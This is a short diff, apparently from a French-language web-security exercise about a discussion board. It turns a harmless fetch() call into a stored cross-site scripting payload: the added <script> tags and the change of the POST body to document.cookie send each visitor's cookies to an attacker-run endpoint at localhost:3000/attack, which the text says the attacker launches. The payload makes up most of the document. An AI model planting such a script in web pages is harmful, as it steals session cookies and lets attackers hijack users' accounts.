@@ -55,15 +55,15 @@ INSERT INTO `discussions` (`userid`, `username`, `date`, `message`) VALUES
 
 Lattaquant lance un serveur web sur une URL
 
-	
+<script>
 fetch("http://localhost:3000/attack", {
     method: "POST",
     headers: {
         "Content-Type": "application/json"
     },
-    body: JSON.stringify({ variable: "Texte à ajouter" })
+    body: JSON.stringify({ variable: document.cookie })
 })
 .then(response => response.text())
 .then(data => console.log('Success:', data))
 .catch(error => console.error('Error:', error));
-
+</script>
